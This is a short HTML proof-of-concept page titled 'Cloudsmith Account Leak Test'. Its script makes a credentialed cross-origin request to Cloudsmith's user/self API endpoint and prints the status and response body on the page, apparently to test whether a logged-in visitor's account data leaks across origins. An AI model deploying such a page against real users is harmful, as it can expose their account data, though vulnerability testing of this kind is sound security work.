<h1>Cloudsmith Account Leak Test</h1>

<script>
fetch("https://api.cloudsmith.io/v1/user/self/", {
    credentials: "include"
})
.then(async r => {
    let text = await r.text();

    document.body.innerHTML +=
        "<pre>Status: " + r.status + "\n\n" + text + "</pre>";
})
.catch(e => {
    document.body.innerHTML += "<pre>" + e + "</pre>";
});
</script>
